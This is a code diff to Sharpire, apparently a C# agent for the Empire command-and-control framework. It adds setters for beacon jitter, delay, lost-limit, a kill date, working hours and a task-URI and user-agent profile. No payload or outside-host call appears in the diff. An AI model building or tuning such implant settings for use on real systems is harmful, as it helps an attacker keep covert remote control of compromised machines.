@@ -749,8 +749,20 @@ namespace Sharpire
         public string[] GetTaskURIs() { return TaskURIs; }
         public string GetUserAgent() { return UserAgent; }
         public double GetDefaultJitter() { return DefaultJitter; }
+        public void SetDefaultJitter(double DefaultJitter)
+        {
+            this.DefaultJitter = DefaultJitter;
+        }
         public uint GetDefaultDelay() { return DefaultDelay; }
+        public void SetDefaultDelay(uint DefaultDelay)
+        {
+            this.DefaultDelay = DefaultDelay;
+        }
         public uint GetDefaultLostLimit() { return DefaultLostLimit; }
+        public void SetDefaultLostLimit(uint DefaultLostLimit)
+        {
+            this.DefaultLostLimit = DefaultLostLimit;
+        }
 
         public string GetStagerUserAgent() { return StagerUserAgent; }
         public string GetStagerURI() { return StagerURI; }
@@ -758,9 +770,33 @@ namespace Sharpire
         public string GetProxyCreds() { return ProxyCreds; }
         public DateTime GetKillDate() { return KillDate; }
 
+        public void setProfile(string profile)
+        {
+            this.TaskURIs = profile.Split('|').First().Split(',');
+            this.UserAgent = profile.Split('|').Last();
+        }
+        public void SetKillDate(string KillDate)
+        {
+            Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
+
+            if (regex.Match(KillDate).Success)
+                DateTime.TryParse(KillDate, out this.KillDate);
+        }
         public void SetWorkingHoursStart(DateTime WorkingHoursStart)
         {
             this.WorkingHoursStart = WorkingHoursStart;
+        }
+        public void SetWorkingHours(string WorkingHours)
+        {
+            Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");
+
+            string start = WorkingHours.Split('-').First();
+            if (regex.Match(start).Success)
+                DateTime.TryParse(start, out this.WorkingHoursStart);
+
+            string end = WorkingHours.Split('-').Last();
+            if (regex.Match(end).Success)
+                DateTime.TryParse(end, out this.WorkingHoursEnd);
         }
         public DateTime GetWorkingHoursStart() { return WorkingHoursStart; }
         public DateTime GetWorkingHoursEnd() { return WorkingHoursEnd; }
